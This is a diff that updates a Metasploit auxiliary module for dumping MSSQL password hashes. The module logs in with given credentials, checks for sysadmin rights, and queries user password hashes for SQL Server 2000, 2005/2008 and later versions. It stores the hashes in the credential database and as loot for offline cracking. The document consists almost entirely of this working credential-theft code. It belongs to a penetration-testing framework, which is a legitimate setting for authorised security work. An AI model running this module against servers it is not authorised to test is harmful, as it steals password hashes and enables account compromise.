@@ -1,118 +1,171 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::MSSQL
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
+  include Msf::OptionalSession::MSSQL
 
+  def initialize
+    super(
+      'Name' => 'MSSQL Password Hashdump',
+      'Description' => %Q{
+          This module extracts the usernames and encrypted password
+        hashes from a MSSQL server and stores them for later cracking.
+        This module also saves information about the server version and
+        table names, which can be used to seed the wordlist.
+      },
+      'Author' => ['theLightCosine'],
+      'License' => MSF_LICENSE
+    )
+  end
 
-require 'msf/core'
+  def run_host(ip)
+    if session
+      set_mssql_session(session.client)
+    elsif !mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
+      info = self.mssql_client.initial_connection_info
+      if info[:errors] && !info[:errors].empty?
+        info[:errors].each do |err|
+          print_error(err)
+        end
+      end
+      return
+    end
 
+    service_data = {
+      address: ip,
+      port: mssql_client.peerport,
+      service_name: 'mssql',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-class Metasploit3 < Msf::Auxiliary
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: datastore['PASSWORD'],
+      private_type: :password,
+      username: datastore['USERNAME']
+    }
 
-	include Msf::Exploit::Remote::MSSQL
-	include Msf::Auxiliary::Report
+    if datastore['DOMAIN'].present?
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_value] = datastore['DOMAIN']
+    end
+    credential_data.merge!(service_data)
 
-	include Msf::Auxiliary::Scanner
+    credential_core = create_credential(credential_data)
 
-	def initialize
-		super(
-			'Name'           => 'MSSQL Password Hashdump',
-			'Version'        => '$Revision$',
-			'Description'    => %Q{
-					This module extracts the usernames and encrypted password
-				hashes from a MSSQL server and stores them for later cracking.
-				This module also saves information about the server version and
-				table names, which can be used to seed the wordlist.
-			},
-			'Author'         => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
-			'License'        => MSF_LICENSE
-		)
-	end
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }
+    login_data.merge!(service_data)
 
-	def run_host(ip)
+    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
 
-		if (not mssql_login_datastore)
-			print_error("#{rhost}:#{rport} - Invalid SQL Server credentials")
-			return
-		end
+    unless is_sysadmin == 0
+      login_data[:access_level] = 'admin'
+    end
 
-		#Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
-		instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
-		print_status("Instance Name: #{instancename.inspect}")
-		version = mssql_query(mssql_sql_info())[:rows][0][0]
-		version_year = version.split('-')[0].slice(/\d\d\d\d/)
+    create_credential_login(login_data)
 
-		mssql_hashes = mssql_hashdump(version_year)
-		unless mssql_hashes.nil?
-			report_hashes(mssql_hashes,version_year)
-		end
+    # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
+    instance_info = mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')
+    instancename = instance_info[1] || instance_info[0]
+    print_status("Instance Name: #{instancename.inspect}")
+    version = mssql_query(mssql_sql_info())[:rows][0][0]
+    version_year = version.split('-')[0].slice(/\d\d\d\d/)
 
-	end
+    unless is_sysadmin == 0
+      mssql_hashes = mssql_hashdump(version_year)
+      unless mssql_hashes.nil? || mssql_hashes.empty?
+        report_hashes(mssql_hashes, version_year)
+      end
+    end
+  end
 
+  # Stores the grabbed hashes as loot for later cracking
+  # The hash format is slightly different between 2k and 2k5/2k8
+  def report_hashes(mssql_hashes, version_year)
+    case version_year
+    when "2000"
+      hashtype = "mssql"
+    when "2005", "2008"
+      hashtype = "mssql05"
+    else
+      hashtype = "mssql12"
+    end
 
-	#Stores the grabbed hashes as loot for later cracking
-	#The hash format is slightly different between 2k and 2k5/2k8
-	def report_hashes(mssql_hashes, version_year)
+    this_service = report_service(
+      :host => mssql_client.peerhost,
+      :port => mssql_client.peerport,
+      :name => 'mssql',
+      :proto => 'tcp'
+    )
 
-		case version_year
-		when "2000"
-			hashtype = "mssql.hashes"
+    service_data = {
+      address: ::Rex::Socket.getaddress(mssql_client.peerhost, true),
+      port: mssql_client.peerport,
+      service_name: 'mssql',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-		when "2005", "2008"
-			hashtype = "mssql05.hashes"
-		end
+    mssql_hashes.each do |row|
+      next if row[0].nil? or row[1].nil?
+      next if row[0].empty? or row[1].empty?
 
-		this_service = report_service(
-					:host  => datastore['RHOST'],
-					:port => datastore['RPORT'],
-					:name => 'mssql',
-					:proto => 'tcp'
-					)
+      username = row[0]
+      upcase_hash = "0x#{row[1].upcase}"
 
-		tbl = Rex::Ui::Text::Table.new(
-			'Header'  => 'MS SQL Server Hashes',
-			'Indent'   => 1,
-			'Columns' => ['Username', 'Hash']
-		)
+      credential_data = {
+        module_fullname: self.fullname,
+        origin_type: :service,
+        private_type: :nonreplayable_hash,
+        private_data: upcase_hash,
+        username: username,
+        jtr_format: hashtype
+      }
 
-		hash_loot=""
-		mssql_hashes.each do |row|
-			next if row[0].nil? or row[1].nil?
-			next if row[0].empty? or row[1].empty?
-			tbl << [row[0], row[1]]
-			print_good("#{rhost}:#{rport} - Saving #{hashtype} = #{row[0]}:#{row[1]}")
-		end
-		filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlhashes.txt"
-		store_loot(hashtype, "text/plain", datastore['RHOST'], tbl.to_csv, filename, "MS SQL Hashes", this_service)
-	end
+      credential_data.merge!(service_data)
 
-	#Grabs the user tables depending on what Version of MSSQL
-	#The queries are different between 2k and 2k/2k8
-	def mssql_hashdump(version_year)
-		is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
+      credential_core = create_credential(credential_data)
 
-		if is_sysadmin == 0
-			print_error("#{rhost}:#{rport} - The provided credentials do not have privileges to read the password hashes")
-			return nil
-		end
+      login_data = {
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
 
-		case version_year
-		when "2000"
-			results = mssql_query(mssql_2k_password_hashes())[:rows]
+      login_data.merge!(service_data)
+      login = create_credential_login(login_data)
 
-		when "2005", "2008"
-			results = mssql_query(mssql_2k5_password_hashes())[:rows]
-		end
+      print_good("Saving #{hashtype} = #{username}:#{upcase_hash}")
+    end
+  end
 
-		return results
+  # Grabs the user tables depending on what Version of MSSQL
+  # The queries are different between 2k and 2k/2k8
+  def mssql_hashdump(version_year)
+    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
 
-	end
+    if is_sysadmin == 0
+      print_error("The provided credentials do not have privileges to read the password hashes")
+      return nil
+    end
 
+    case version_year
+    when "2000"
+      results = mssql_query(mssql_2k_password_hashes())[:rows]
+    else
+      results = mssql_query(mssql_2k5_password_hashes())[:rows]
+    end
 
+    return results
+  end
 end
